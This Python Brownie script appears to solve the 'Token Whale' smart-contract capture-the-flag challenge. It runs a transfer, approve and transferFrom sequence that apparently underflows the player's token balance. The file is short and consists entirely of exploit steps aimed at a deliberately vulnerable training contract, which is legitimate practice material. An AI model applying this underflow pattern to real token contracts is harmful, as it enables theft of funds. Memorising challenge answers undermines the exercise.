import math
from brownie import (
    network,
    accounts,
    config,
    interface,
    Contract,
    TokenWhaleChallenge
)
from scripts.helpful_scripts import (
    get_account,
    get_challenge_contract,
    check_solution,
)
from web3 import Web3


def main():
    player = get_account("player")
    non_player = get_account("non_player")
    challenge_contract = get_challenge_contract(TokenWhaleChallenge, "token_whale", [player], {"from": player})

    tx = challenge_contract.transfer(non_player, 501, {"from": player})
    tx.wait(1)
    tx = challenge_contract.approve(player, 1000, {"from": non_player})
    tx.wait(1)
    tx = challenge_contract.transferFrom(non_player, non_player, 500, {"from": player})
    tx.wait(1)

    check_solution(challenge_contract.address)